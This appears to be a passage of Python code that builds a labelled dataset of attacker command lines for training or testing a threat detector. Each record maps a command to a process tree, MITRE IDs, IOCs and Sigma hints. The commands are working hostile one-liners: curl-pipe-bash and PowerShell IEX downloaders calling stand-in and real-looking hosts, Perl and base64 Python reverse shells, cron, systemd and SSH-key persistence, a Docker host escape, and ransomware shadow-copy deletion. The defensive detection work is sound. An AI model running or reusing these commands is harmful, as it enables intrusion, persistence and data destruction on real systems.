_add(_rec("NIVX_LOL_011", "lolbin", "windows",
    "cmstp.exe /au C:\\Users\\Public\\evil.inf",
    "cmstp autonomous UAC bypass via crafted .inf.",
    _tree("windows",
        _n("cmstp.exe","cmstp.exe /au C:\\Users\\Public\\evil.inf",
           "CMSTP UAC bypass",
           ["T1548.002","T1218.003"], "privilege-escalation",
           path=r"C:\Windows\System32\cmstp.exe", signer="Microsoft Windows", lolbin=True,
           cite="cmstp.exe /au"),
        "CMSTP autonomous UAC bypass", "critical",
        ["T1548.002","T1218.003"], ["privilege-escalation","defense-evasion"],
        iocs={"files":["evil.inf"]},
        lolbins=["cmstp.exe"],
        sigma=["Sigma: cmstp.exe /au with .inf path"],
        summary="Auto-elevated LOLBin executing RunPreSetupCommands from INF."),
    tags=["lolbin","cmstp","uac-bypass"], diff="hard"))

_add(_rec("NIVX_LOL_012", "lolbin", "windows",
    "csc.exe /out:C:\\Users\\Public\\a.exe C:\\Users\\Public\\a.cs && C:\\Users\\Public\\a.exe",
    "In-place C# compile + execute (LotL compiler).",
    _tree("windows",
        _n("csc.exe","csc.exe /out:C:\\Users\\Public\\a.exe C:\\Users\\Public\\a.cs",
           "C# compiler LotL",
           ["T1027.004"], "defense-evasion",
           path=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
           signer="Microsoft Windows", lolbin=True,
           cite="csc.exe /out:",
           children=[_n("a.exe", r"C:\Users\Public\a.exe","Compiled binary",
                        ["T1204.002"], "execution", cite="a.exe",
                        inferred=True, conf=0.7)]),
        "csc.exe LotL compilation", "medium",
        ["T1027.004","T1204.002"], ["defense-evasion","execution"],
        lolbins=["csc.exe"],
        iocs={"files":["a.cs","a.exe"]},
        sigma=["Sigma: csc.exe /out: with .cs file"],
        summary="Attacker delivers .cs → compiled on-host to evade file scanning."),
    tags=["lolbin","csc","compile"], diff="medium"))


# ─── Office macro / JS / HTA / MSI (5 unique) ────────────────────────────
_add(_rec("NIVX_OFFICE_001", "office-macro", "windows",
    "EXCEL.EXE  → VBA Shell(\"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://c2/xl')\")",
    "Excel macro spawns PowerShell IEX downloader.",
    _tree("windows",
        _n("EXCEL.EXE","EXCEL.EXE C:\\Users\\Public\\a.xlsm",
           "Weaponised workbook",
           ["T1204.002"], "execution", path=r"C:\Program Files\Microsoft Office\...\EXCEL.EXE",
           signer="Microsoft Office", cite="EXCEL.EXE",
           children=[_n("powershell.exe",
                        "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://c2/xl')",
                        "VBA-spawned PowerShell stager",
                        ["T1059.001","T1105"], "execution",
                        cite="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://c2/xl')")]),
        "Excel VBA macro → PowerShell downloader", "high",
        ["T1204.002","T1059.001","T1105"], ["execution","command-and-control"],
        iocs={"urls":["http://c2/xl"], "domains":["c2"]},
        sigma=["Sigma: EXCEL.EXE parent → powershell.exe child"],
        summary="Classic macro-borne PowerShell stager — high-fidelity SIEM hunt."),
    tags=["office","excel","macro"], diff="easy"))

_add(_rec("NIVX_OFFICE_002", "office-macro", "windows",
    "WINWORD.EXE → mshta http://c2.example/x.hta",
    "Word doc VBA launches mshta remote HTA.",
    _tree("windows",
        _n("WINWORD.EXE","WINWORD.EXE C:\\Users\\Public\\a.docm",
           "Weaponised .docm",
           ["T1204.002"], "execution",
           signer="Microsoft Office", cite="WINWORD.EXE",
           children=[_n("mshta.exe","mshta http://c2.example/x.hta",
                        "VBA-spawned mshta", ["T1218.005","T1105"], "execution",
                        lolbin=True, cite="mshta http://c2.example/x.hta")]),
        "Word macro → mshta remote HTA", "high",
        ["T1204.002","T1218.005","T1105"], ["execution","defense-evasion"],
        iocs={"urls":["http://c2.example/x.hta"], "domains":["c2.example"]},
        lolbins=["mshta.exe"],
        sigma=["Sigma: WINWORD.EXE parent → mshta.exe child"],
        summary="Word macro sidesteps AWL via signed mshta."),
    tags=["office","word","hta"], diff="medium"))

_add(_rec("NIVX_JS_001", "jscript", "windows",
    "cscript //E:jscript C:\\Users\\Public\\a.js",
    "cscript runs attacker JScript that spawns cmd calc.",
    _tree("windows",
        _n("cscript.exe","cscript //E:jscript C:\\Users\\Public\\a.js",
           "WSH cscript JScript exec",
           ["T1059.007"], "execution",
           path=r"C:\Windows\System32\cscript.exe", signer="Microsoft Windows",
           cite="cscript //E:jscript",
           children=[_n("cmd.exe","cmd.exe /c calc","JS-launched proxy",
                        ["T1059.003"], "execution", cite="cmd.exe /c calc",
                        inferred=True, conf=0.6)]),
        "WSH JScript execution proxy", "medium",
        ["T1059.007","T1059.003"], ["execution"],
        iocs={"files":["a.js"]},
        sigma=["Sigma: cscript with //E:jscript switch"],
        summary="cscript engine-force runs .js file with WScript object model."),
    tags=["jscript","wsh"], diff="easy"))


# ─── Bash / Linux (10 unique) ────────────────────────────────────────────
_add(_rec("NIVX_LNX_001", "bash", "linux",
    "curl -fsSL http://malicious.example/x.sh | bash",
    "Classic curl-pipe-bash download and execute.",
    _tree("linux",
        _n("bash","bash -c 'curl -fsSL http://malicious.example/x.sh | bash'",
           "curl|bash one-liner",
           ["T1059.004","T1105"], "execution",
           path="/bin/bash", cite="curl -fsSL http://malicious.example/x.sh | bash",
           children=[
               _n("curl","curl -fsSL http://malicious.example/x.sh","Payload fetch",
                  ["T1105"], "command-and-control", path="/usr/bin/curl",
                  cite="curl -fsSL http://malicious.example/x.sh"),
               _n("bash","bash","Executes piped script",
                  ["T1059.004"], "execution", path="/bin/bash", cite="| bash",
                  inferred=True, conf=0.7),
           ]),
        "curl-pipe-bash remote exec", "high",
        ["T1059.004","T1105"], ["execution","command-and-control"],
        iocs={"urls":["http://malicious.example/x.sh"], "domains":["malicious.example"]},
        sigma=["Sigma: curl -fsSL | bash pattern"],
        summary="Standard Linux dropper — remote script piped straight to bash."),
    tags=["linux","curl","pipe-bash"], diff="easy"))

_add(_rec("NIVX_LNX_002", "bash", "linux",
    "wget -qO- http://c2.example/x.sh | sh",
    "wget-pipe-sh variant.",
    _tree("linux",
        _n("sh","sh -c 'wget -qO- http://c2.example/x.sh | sh'","wget|sh one-liner",
           ["T1059.004","T1105"], "execution", path="/bin/sh",
           cite="wget -qO- http://c2.example/x.sh | sh",
           children=[
               _n("wget","wget -qO- http://c2.example/x.sh","Payload fetch",
                  ["T1105"], "command-and-control", path="/usr/bin/wget",
                  cite="wget -qO- http://c2.example/x.sh"),
               _n("sh","sh","Piped executor",
                  ["T1059.004"], "execution", path="/bin/sh", cite="| sh",
                  inferred=True, conf=0.7),
           ]),
        "wget-pipe-sh remote exec", "high",
        ["T1059.004","T1105"], ["execution","command-and-control"],
        iocs={"urls":["http://c2.example/x.sh"], "domains":["c2.example"]},
        sigma=["Sigma: wget -qO- | sh pattern"],
        summary="Same as curl-pipe-bash but wget variant used by IoT malware."),
    tags=["linux","wget","pipe-sh"], diff="easy"))

_add(_rec("NIVX_LNX_003", "bash", "linux",
    "echo 'aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgnMTAuMC4wLjUnLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKQ==' | base64 -d | python -",
    "Base64 python reverse shell → 10.0.0.5:4444.",
    _tree("linux",
        _n("bash","bash -c 'echo ... | base64 -d | python -'","Base64 python reverse shell",
           ["T1059.004","T1059.006","T1027"], "execution", path="/bin/bash",
           cite="| base64 -d | python -",
           children=[
               _n("python","python -","Reverse shell interpreter",
                  ["T1059.006","T1095"], "execution", cite="python -",
                  children=[_n("sh","/bin/sh","pty-spawned shell",
                               ["T1059.004"], "execution", path="/bin/sh",
                               cite="pty.spawn(\"/bin/sh\")", inferred=True, conf=0.75)]),
           ]),
        "Python reverse shell dropper", "critical",
        ["T1059.004","T1059.006","T1095","T1027"], ["execution","command-and-control"],
        iocs={"ips":["10.0.0.5"]},
        sigma=["Sigma: base64 -d | python - one-liner"],
        summary="Base64-decoded Python opens reverse TCP to 10.0.0.5:4444."),
    tags=["linux","python","reverse-shell"], diff="medium"))

_add(_rec("NIVX_LNX_004", "cron", "linux",
    "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://c2/x.sh | bash') | crontab -",
    "Cron persistence every 5 minutes running remote script.",
    _tree("linux",
        _n("bash","bash -c '(crontab -l 2>/dev/null; echo ...) | crontab -'","Cron persistence add",
           ["T1053.003"], "persistence", path="/bin/bash",
           cite="| crontab -",
           children=[_n("crontab","crontab -","Persistence writer",
                        ["T1053.003"], "persistence", path="/usr/bin/crontab",
                        cite="crontab -")]),
        "Cron persistence 5-min beacon", "high",
        ["T1053.003","T1059.004","T1105"], ["persistence","command-and-control"],
        iocs={"urls":["http://c2/x.sh"], "domains":["c2"]},
        sigma=["Sigma: crontab - stdin with curl+bash in cmdline"],
        summary="Recurring cron entry beacons every 5 min via curl|bash."),
    tags=["linux","cron","persistence"], diff="medium"))

_add(_rec("NIVX_LNX_005", "systemd", "linux",
    "cat > /etc/systemd/system/upd.service <<EOF\n[Unit]\nDescription=upd\n[Service]\nExecStart=/bin/bash -c 'curl http://c2/y | bash'\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable upd && systemctl start upd",
    "Rogue systemd unit that beacons on every boot.",
    _tree("linux",
        _n("bash","bash -c 'cat > /etc/systemd/system/upd.service <<EOF ...'","Systemd unit writer",
           ["T1543.002"], "persistence", user="root", integrity="high", path="/bin/bash",
           cite="/etc/systemd/system/upd.service",
           children=[
               _n("systemctl","systemctl enable upd","Enable unit",
                  ["T1543.002"], "persistence", path="/bin/systemctl",
                  cite="systemctl enable upd"),
               _n("systemctl","systemctl start upd","Start unit",
                  ["T1543.002"], "persistence", path="/bin/systemctl",
                  cite="systemctl start upd",
                  children=[_n("bash","/bin/bash -c 'curl http://c2/y | bash'","Unit ExecStart",
                               ["T1059.004","T1105"], "execution", path="/bin/bash",
                               cite="curl http://c2/y | bash", inferred=True, conf=0.7)]),
           ]),
        "Systemd unit persistence + beacon", "critical",
        ["T1543.002","T1059.004","T1105"], ["persistence","execution","command-and-control"],
        iocs={"urls":["http://c2/y"], "domains":["c2"], "files":["upd.service"]},
        sigma=["Sigma: write to /etc/systemd/system + systemctl enable in same session"],
        summary="Root-level systemd service beacons on every boot — hard to remove."),
    tags=["linux","systemd","persistence"], diff="hard"))

_add(_rec("NIVX_LNX_006", "ssh", "linux",
    "echo 'ssh-rsa AAAAB3Nz...attacker' >> /root/.ssh/authorized_keys",
    "SSH authorized_keys backdoor as root.",
    _tree("linux",
        _n("bash","bash -c \"echo 'ssh-rsa AAAAB3Nz...attacker' >> /root/.ssh/authorized_keys\"",
           "Authorized-keys backdoor",
           ["T1098.004"], "persistence", user="root", integrity="high", path="/bin/bash",
           cite="/root/.ssh/authorized_keys"),
        "SSH authorized_keys backdoor", "critical",
        ["T1098.004"], ["persistence"],
        iocs={"files":["/root/.ssh/authorized_keys"]},
        sigma=["Sigma: append to /*/.ssh/authorized_keys by non-user process"],
        summary="Persistent root access via injected public key — evades AV."),
    tags=["linux","ssh","backdoor"], diff="easy"))

_add(_rec("NIVX_LNX_007", "bash", "linux",
    "perl -e 'use Socket;$i=\"10.0.0.5\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "Perl reverse shell to 10.0.0.5:4444.",
    _tree("linux",
        _n("perl","perl -e 'use Socket;$i=\"10.0.0.5\";$p=4444;...'","Perl reverse-TCP shell",
           ["T1059.004","T1095"], "execution", path="/usr/bin/perl",
           cite="Socket;$i=\"10.0.0.5\";$p=4444",
           children=[_n("sh","/bin/sh -i","Exec'd interactive shell",
                        ["T1059.004"], "execution", path="/bin/sh",
                        cite="/bin/sh -i", inferred=True, conf=0.75)]),
        "Perl reverse-TCP shell", "critical",
        ["T1059.004","T1095"], ["execution","command-and-control"],
        iocs={"ips":["10.0.0.5"]},
        sigma=["Sigma: perl one-liner containing Socket + sockaddr_in"],
        summary="Perl-based reverse shell — common on legacy Linux servers."),
    tags=["linux","perl","reverse-shell"], diff="medium"))

_add(_rec("NIVX_LNX_008", "docker", "container",
    "docker run --rm -v /:/host --privileged alpine sh -c \"chroot /host bash -c 'id'\"",
    "Container escape via mounted host root.",
    _tree("container",
        _n("docker","docker run --rm -v /:/host --privileged alpine sh -c \"chroot /host bash -c 'id'\"",
           "Privileged container mounting host /",
           ["T1611"], "privilege-escalation",
           path="/usr/bin/docker", cite="-v /:/host --privileged",
           children=[_n("sh","sh -c \"chroot /host bash -c 'id'\"","Chroot into host",
                        ["T1611"], "privilege-escalation",
                        cite="chroot /host bash -c 'id'",
                        children=[_n("bash","bash -c 'id'","Host root shell",
                                     ["T1611","T1059.004"], "execution",
                                     cite="bash -c 'id'", inferred=True, conf=0.8)])]),
        "Docker container-escape (host mount)", "critical",
        ["T1611","T1059.004"], ["privilege-escalation","execution"],
        sigma=["Sigma: docker run with -v /:/host + --privileged"],
        summary="Privileged container with host root mount → trivial escape."),
    tags=["container","docker","escape"], diff="hard"))

_add(_rec("NIVX_LNX_009", "kubectl", "container",
    "kubectl exec -it -n kube-system $(kubectl get pods -n kube-system -l k8s-app=kube-dns -o name | head -1) -- sh",
    "Kubectl exec into kube-dns pod for lateral movement.",
    _tree("container",
        _n("kubectl","kubectl exec -it -n kube-system POD -- sh","kubectl exec kube-dns",
           ["T1610"], "execution", cite="kubectl exec -it -n kube-system",
           children=[_n("sh","sh","Pod shell",
                        ["T1059.004"], "execution", cite="-- sh",
                        inferred=True, conf=0.75)]),
        "kubectl exec lateral into kube-system", "high",
        ["T1610","T1059.004"], ["execution","lateral-movement"],
        sigma=["Sigma: kubectl exec targeting kube-system namespace"],
        summary="Attacker-controlled kubectl pivots into cluster infra namespace."),
    tags=["container","kubectl","lateral"], diff="hard"))


# ─── Ransomware / discovery / cloud (5 unique) ───────────────────────────
_add(_rec("NIVX_RANS_001", "ransomware", "windows",
    "vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet && bcdedit /set {default} recoveryenabled No",
    "Ransomware VSS + recovery neutralisation.",
    _tree("windows",
        _n("cmd.exe","cmd.exe /c \"vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet && bcdedit /set {default} recoveryenabled No\"",
           "Anti-recovery chain",
           ["T1490","T1059.003"], "impact",
           user="SYSTEM", integrity="high",
           cite="vssadmin delete shadows /all /quiet",
           children=[
               _n("vssadmin.exe","vssadmin delete shadows /all /quiet","VSS wipe",
                  ["T1490"], "impact", path=r"C:\Windows\System32\vssadmin.exe",
                  cite="vssadmin delete shadows /all /quiet"),
               _n("wbadmin.exe","wbadmin delete catalog -quiet","Backup catalog wipe",
                  ["T1490"], "impact", path=r"C:\Windows\System32\wbadmin.exe",
                  cite="wbadmin delete catalog -quiet"),
               _n("bcdedit.exe","bcdedit /set {default} recoveryenabled No","Disable WinRE",
                  ["T1490"], "impact", path=r"C:\Windows\System32\bcdedit.exe",
                  cite="bcdedit /set {default} recoveryenabled No"),
           ]),
        "Ransomware pre-encryption anti-recovery chain", "critical",
        ["T1490","T1059.003"], ["impact"],
        sigma=["Sigma: vssadmin+wbadmin+bcdedit within 60s window"],
        summary="Textbook ransomware pre-encryption VSS/backup/recovery neutralisation."),
    tags=["ransomware","impact","vss"], diff="medium"))

_add(_rec("NIVX_DISC_001", "discovery", "windows",
    "cmd.exe /c \"whoami /all & net user & net localgroup administrators & systeminfo & ipconfig /all & tasklist /v\"",
    "Bulk host/user/network discovery chain.",
    _tree("windows",
        _n("cmd.exe","cmd.exe /c \"whoami /all & net user & net localgroup administrators & systeminfo & ipconfig /all & tasklist /v\"",
           "Discovery batch",
           ["T1082","T1033","T1069.001","T1016","T1057"], "discovery",
           cite="whoami /all & net user",
           children=[
               _n("whoami.exe","whoami /all","User+privs enum",
                  ["T1033","T1059.003"], "discovery", cite="whoami /all"),
               _n("net.exe","net user","Local users",
                  ["T1087.001"], "discovery", cite="net user"),
               _n("net.exe","net localgroup administrators","Admins",
                  ["T1069.001"], "discovery", cite="net localgroup administrators"),
               _n("systeminfo.exe","systeminfo","Host info",
                  ["T1082"], "discovery", cite="systeminfo"),
               _n("ipconfig.exe","ipconfig /all","Network",
                  ["T1016"], "discovery", cite="ipconfig /all"),
               _n("tasklist.exe","tasklist /v","Process enum",
                  ["T1057"], "discovery", cite="tasklist /v"),
           ]),
        "Bulk host discovery burst", "medium",
        ["T1082","T1033","T1069.001","T1016","T1057","T1087.001","T1059.003"],
        ["discovery"],
        sigma=["Sigma: 5+ discovery commands via cmd.exe within 60s"],
        summary="High-fidelity SOC hunt — burst of discovery utilities via a single cmd."),
    tags=["discovery","recon"], diff="easy"))

_add(_rec("NIVX_CLOUD_001", "cloud-cli", "linux",
    "aws sts get-caller-identity && aws iam list-users && aws s3api list-buckets && aws ec2 describe-instances --region us-east-1",
    "AWS CLI enumeration post-credential-theft.",
    _tree("linux",
        _n("bash","bash -c 'aws sts get-caller-identity && aws iam list-users && aws s3api list-buckets && aws ec2 describe-instances --region us-east-1'",
           "AWS enumeration chain",
           ["T1580","T1069.003"], "discovery", path="/bin/bash",
           cite="aws sts get-caller-identity",
           children=[
               _n("aws","aws sts get-caller-identity","STS whoami",
                  ["T1580"], "discovery", cite="aws sts get-caller-identity"),
               _n("aws","aws iam list-users","IAM enum",
                  ["T1069.003"], "discovery", cite="aws iam list-users"),
               _n("aws","aws s3api list-buckets","S3 inventory",
                  ["T1580"], "discovery", cite="aws s3api list-buckets"),
               _n("aws","aws ec2 describe-instances --region us-east-1","EC2 inventory",
                  ["T1580"], "discovery", cite="aws ec2 describe-instances"),
           ]),
        "AWS credential post-compromise enumeration", "high",
        ["T1580","T1069.003"], ["discovery"],
        sigma=["Sigma: aws CLI called with sts+iam+s3api+ec2 in <60s"],
        summary="Standard AWS creds-verified sequence — inventory + identify targets."),
    tags=["cloud","aws","enumeration"], diff="medium"))


# ─── macOS (3 unique) ────────────────────────────────────────────────────
_add(_rec("NIVX_MAC_001", "osascript", "macos",
    "osascript -e 'do shell script \"curl -o /tmp/x http://c2/y && chmod +x /tmp/x && /tmp/x\" with administrator privileges'",
    "AppleScript privileged download-and-execute.",
    _tree("macos",
        _n("osascript","osascript -e 'do shell script ... with administrator privileges'",
           "AppleScript privileged shell",
           ["T1059.002","T1548.004"], "execution",
           path="/usr/bin/osascript",
           cite="do shell script",
           children=[_n("sh","sh -c 'curl -o /tmp/x http://c2/y && chmod +x /tmp/x && /tmp/x'",
                        "Privilege escalated shell", ["T1059.004","T1105"], "execution",
                        cite="curl -o /tmp/x http://c2/y",
                        children=[_n("x","/tmp/x","Dropped Mach-O",
                                     ["T1204.002"], "execution", path="/tmp/x",
                                     cite="/tmp/x", inferred=True, conf=0.7)])]),
        "macOS AppleScript privileged loader", "critical",
        ["T1059.002","T1059.004","T1548.004","T1105","T1204.002"],
        ["execution","privilege-escalation","command-and-control"],
        iocs={"urls":["http://c2/y"], "domains":["c2"], "files":["/tmp/x"]},
        sigma=["Sigma: osascript containing 'with administrator privileges' and curl"],
        summary="AppleScript UAC-equivalent bypass to fetch + run Mach-O in /tmp."),
    tags=["macos","osascript","persistence"], diff="hard"))

_add(_rec("NIVX_MAC_002", "launchctl", "macos",
    "cat > ~/Library/LaunchAgents/com.upd.plist <<EOF ... EOF; launchctl load ~/Library/LaunchAgents/com.upd.plist",
    "LaunchAgent persistence in user's Library.",
    _tree("macos",
        _n("bash","bash -c 'cat > ~/Library/LaunchAgents/com.upd.plist <<EOF ... EOF; launchctl load ~/Library/LaunchAgents/com.upd.plist'",
           "LaunchAgent persist",
           ["T1543.001"], "persistence", path="/bin/bash",
           cite="~/Library/LaunchAgents/com.upd.plist",
           children=[_n("launchctl","launchctl load ~/Library/LaunchAgents/com.upd.plist",
                        "Register agent", ["T1543.001"], "persistence",
                        path="/bin/launchctl",
                        cite="launchctl load ~/Library/LaunchAgents/com.upd.plist")]),
        "LaunchAgent persistence", "high",
        ["T1543.001"], ["persistence"],
        iocs={"files":["com.upd.plist"]},
        sigma=["Sigma: write plist under Library/LaunchAgents + launchctl load"],
        summary="User-level auto-launch on login — no admin needed."),
    tags=["macos","launchagent","persistence"], diff="medium"))


# ======================================================================= #
# Parameter-varied siblings — generate variants across URLs / IPs / paths
# to reach 100+ realistic training rows without unrealistic duplicates.
# ======================================================================= #
def _variants() -> List[TrainingRecord]:
    """Generate 60+ realistic parameter-varied siblings from the base archetypes."""
    out: List[TrainingRecord] = []

    # A) PowerShell IEX downloader — 8 URL/domain variants
    ps_urls = [
        ("http://updates-microsoft.co/s.ps1","updates-microsoft.co"),
        ("https://cdn.hxxp-live.io/loader.ps1","cdn.hxxp-live.io"),
        ("http://185.199.108.153/s.ps1","185.199.108.153"),
        ("https://raw.githubusercontent.com/attacker/repo/main/s.ps1","raw.githubusercontent.com"),
        ("http://malware-cnc.top/s","malware-cnc.top"),
        ("http://c2.duckdns.org/x","c2.duckdns.org"),
        ("http://sample.hosting-provider.ru/s.ps1","sample.hosting-provider.ru"),
        ("http://staging.deception.io/init","staging.deception.io"),
    ]
    for i, (url, dom) in enumerate(ps_urls, 1):
        raw = f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\""
        out.append(_rec(f"NIVX_PS_002_V{i}", "powershell", "windows", raw,
            f"PowerShell IEX downloader ({dom}).",
            _tree("windows",
                _n("powershell.exe", raw, "IEX remote downloader",
                   ["T1059.001","T1105","T1071.001"], "execution",
                   cite=f"DownloadString('{url}')"),
                f"PowerShell IEX loader → {dom}", "high",
                ["T1059.001","T1105","T1071.001"], ["execution","command-and-control"],
                iocs={"urls":[url], "domains":[dom]},
                sigma=["Sigma: DownloadString + IEX in single cmdline"],
                summary=f"Fetches remote PowerShell from {dom} and IEX-executes."),
            tags=["ps","iex","downloader","variant"], diff="easy"))

    # B) certutil download variants
    cu = [
        ("http://update-server.io/a.exe","update-server.io","a.exe"),
        ("http://195.201.55.44/w.exe","195.201.55.44","w.exe"),
        ("https://storage.googleapis.com/bkt/pl.exe","storage.googleapis.com","pl.exe"),
        ("http://cdn-static.click/loader.exe","cdn-static.click","loader.exe"),
        ("http://s3.us-east-1.amazonaws.com/bkt/x.exe","s3.us-east-1.amazonaws.com","x.exe"),
        ("http://89.248.171.23/p.dll","89.248.171.23","p.dll"),
    ]
    for i, (url, dom, fn) in enumerate(cu, 1):
        raw = f"certutil.exe -urlcache -split -f {url} %TEMP%\\{fn} && %TEMP%\\{fn}"
        out.append(_rec(f"NIVX_LOL_001_V{i}", "lolbin", "windows", raw,
            f"Certutil downloads {fn} from {dom} and executes.",
            _tree("windows",
                _n("certutil.exe",
                   f"certutil.exe -urlcache -split -f {url} %TEMP%\\{fn}",
                   "LOLBin certutil download",
                   ["T1105","T1218"], "command-and-control",
                   lolbin=True, path=r"C:\Windows\System32\certutil.exe",
                   signer="Microsoft Windows", cite=f"certutil.exe -urlcache -split -f {url}",
                   children=[_n(fn, f"%TEMP%\\{fn}", "Dropped payload",
                                ["T1204.002"], "execution",
                                path=f"C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\{fn}",
                                cite=fn, inferred=True, conf=0.65)]),
                f"Certutil download-and-execute ({dom})", "high",
                ["T1105","T1218","T1204.002"], ["command-and-control","execution"],
                iocs={"urls":[url], "domains":[dom], "files":[fn]},
                lolbins=["certutil.exe"],
                sigma=["Sigma: certutil -urlcache -split -f (network)"],
                summary=f"Signed certutil abused to fetch {fn} from {dom}."),
            tags=["lolbin","certutil","variant"], diff="easy"))

    # C) curl|bash variants (linux)
    lnx_urls = [
        ("http://install.crypto-miner.io/x.sh","install.crypto-miner.io"),
        ("https://raw.githubusercontent.com/attacker/x/main/i.sh","raw.githubusercontent.com"),
        ("http://45.61.169.192/i.sh","45.61.169.192"),
        ("http://coin-miner.top/i","coin-miner.top"),
        ("http://185.220.101.5/x","185.220.101.5"),
        ("http://dns-tunnel.ru/i.sh","dns-tunnel.ru"),
        ("http://c2.zerotier.io/s","c2.zerotier.io"),
        ("http://payload.gitlab.io/i.sh","payload.gitlab.io"),
    ]
    for i, (url, dom) in enumerate(lnx_urls, 1):
        raw = f"curl -fsSL {url} | bash"
        out.append(_rec(f"NIVX_LNX_001_V{i}", "bash", "linux", raw,
            f"curl-pipe-bash from {dom}.",
            _tree("linux",
                _n("bash", f"bash -c '{raw}'", "curl|bash one-liner",
                   ["T1059.004","T1105"], "execution", path="/bin/bash",
                   cite=raw,
                   children=[
                       _n("curl", f"curl -fsSL {url}", "Payload fetch",
                          ["T1105"], "command-and-control",
                          path="/usr/bin/curl", cite=f"curl -fsSL {url}"),
                       _n("bash","bash","Piped executor",
                          ["T1059.004"], "execution", path="/bin/bash",
                          cite="| bash", inferred=True, conf=0.7),
                   ]),
                f"Linux curl-pipe-bash → {dom}", "high",
                ["T1059.004","T1105"], ["execution","command-and-control"],
                iocs={"urls":[url], "domains":[dom]},
                sigma=["Sigma: curl -fsSL | bash pattern"],
                summary=f"Remote bootstrap from {dom} piped straight into bash."),
            tags=["linux","curl","pipe-bash","variant"], diff="easy"))

    # D) schtasks variants
    sch = [
        ("Adobe Updater","ONLOGON","http://cdn-fastly.com/ad.ps1"),
        ("OneDriveSync","ONSTART","http://onedrive-sync.io/i.ps1"),
        ("EdgeUpdater","MINUTE /MO 30","http://edge-updater.co/x"),
        ("ChromeUpdater","HOURLY","http://chrome-updater.io/y"),
        ("SystemHealth","ONSTART","http://health-check.io/s"),
        ("WindowsMaint","DAILY","http://win-maint.top/z"),
    ]
    for i,(name, sc, url) in enumerate(sch, 1):
        raw = f"schtasks /Create /SC {sc} /TN \"{name}\" /TR \"powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('{url}')\" /RL HIGHEST /F"
        out.append(_rec(f"NIVX_CMD_002_V{i}", "cmd", "windows", raw,
            f"Scheduled task '{name}' ({sc}) runs remote stager.",
            _tree("windows",
                _n("schtasks.exe", raw, f"Scheduled task '{name}'",
                   ["T1053.005"], "persistence",
                   path=r"C:\Windows\System32\schtasks.exe", lolbin=True,
                   cite=f"/TN \"{name}\"",
                   children=[_n("powershell.exe",
                                f"powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('{url}')",
                                "Task-invoked stager",
                                ["T1059.001","T1105"], "execution",
                                cite=f"DownloadString('{url}')",
                                inferred=True, conf=0.75)]),
                f"SCHTASKS persistence '{name}'", "high",
                ["T1053.005","T1059.001","T1105"], ["persistence","execution"],
                iocs={"urls":[url]}, lolbins=["schtasks.exe"],
                sigma=["Sigma: schtasks /RL HIGHEST + powershell in /TR"],
                summary=f"Recurring '{name}' task fetches PowerShell stager."),
            tags=["cmd","schtasks","variant"], diff="medium"))

    # E) mshta variants
    mh = [
        "http://malicious-hta.io/x.hta",
        "https://cdn.badactor.top/y.hta",
        "http://185.100.87.202/loader.hta",
        "https://storage.googleapis.com/x/z.hta",
        "http://c2.paste.io/x.hta",
        "http://185.220.100.240/i.hta",
    ]
    for i, url in enumerate(mh, 1):
        dom = url.split("/")[2]
        raw = f"mshta.exe {url}"
        out.append(_rec(f"NIVX_LOL_003_V{i}", "lolbin", "windows", raw,
            f"mshta remote HTA from {dom}.",
            _tree("windows",
                _n("mshta.exe", raw, "Remote HTA loader",
                   ["T1218.005","T1105"], "defense-evasion",
                   path=r"C:\Windows\System32\mshta.exe", lolbin=True,
                   cite=raw),
                f"mshta remote HTA → {dom}", "high",
                ["T1218.005","T1105"], ["defense-evasion","execution"],
                iocs={"urls":[url], "domains":[dom]}, lolbins=["mshta.exe"],
                sigma=["Sigma: mshta.exe with http URL"],
                summary=f"Signed mshta bypass fetching {dom} HTA."),
            tags=["lolbin","mshta","variant"], diff="easy"))

    # F) Bitsadmin variants
    bt = [
        ("http://a.badcdn.io/p.exe","a.badcdn.io","p.exe"),
        ("http://185.220.101.32/w.exe","185.220.101.32","w.exe"),
        ("http://cdn.malstore.top/pl.exe","cdn.malstore.top","pl.exe"),
        ("http://d3.cloudfront.net/x.exe","d3.cloudfront.net","x.exe"),
    ]
    for i,(url,dom,fn) in enumerate(bt, 1):
        raw = f"bitsadmin /transfer j {url} %TEMP%\\{fn} && %TEMP%\\{fn}"
        out.append(_rec(f"NIVX_LOL_002_V{i}", "lolbin", "windows", raw,
            f"BITS download of {fn} from {dom}.",
            _tree("windows",
                _n("bitsadmin.exe", f"bitsadmin /transfer j {url} %TEMP%\\{fn}",
                   "BITS transfer",
                   ["T1197","T1105"], "defense-evasion", lolbin=True,
                   path=r"C:\Windows\System32\bitsadmin.exe",
                   cite=f"bitsadmin /transfer j {url}",
                   children=[_n(fn, f"%TEMP%\\{fn}", "Dropped binary",
                                ["T1204.002"], "execution",
                                cite=fn, inferred=True, conf=0.65)]),
                f"BITS downloader ({dom})", "high",
                ["T1197","T1105","T1204.002"], ["defense-evasion","command-and-control"],
                iocs={"urls":[url], "domains":[dom], "files":[fn]},
                lolbins=["bitsadmin.exe"],
                sigma=["Sigma: bitsadmin /transfer with HTTP URL"],
                summary=f"BITS abused to fetch {fn} from {dom}."),
            tags=["lolbin","bitsadmin","variant"], diff="easy"))

    # G) PowerShell EncodedCommand IP variants
    ip_targets = [
        ("http://185.220.101.5/a","185.220.101.5"),
        ("http://45.61.169.192/b","45.61.169.192"),
        ("http://89.248.171.23/c","89.248.171.23"),
        ("http://195.201.55.44/d","195.201.55.44"),
